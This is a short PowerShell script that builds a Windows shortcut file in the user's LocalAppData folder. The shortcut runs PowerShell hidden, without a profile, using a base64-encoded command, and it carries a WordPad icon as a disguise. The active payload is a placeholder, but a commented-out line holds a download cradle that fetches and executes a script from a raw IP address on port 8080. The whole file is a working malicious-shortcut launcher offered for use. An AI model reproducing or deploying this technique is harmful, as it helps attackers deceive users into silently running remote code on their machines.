#$command = "iex (New-Object Net.WebClient).DownloadString('http://192.241.131.103:8080/p.txt')"
$command = "<malicious_ps1_code_executed_by_lnk>"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
$obj = New-object -comobject wscript.shell
$link = $obj.createshortcut("$Env:LocalAppData\shell.lnk")
$link.windowstyle = "7"
$link.targetpath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$link.iconlocation = "C:\Program Files\Windows NT\Accessories\wordpad.exe"
$link.arguments = "-Nop -sta -noni -w hidden -encodedCommand $encodedCommand"
$link.save()
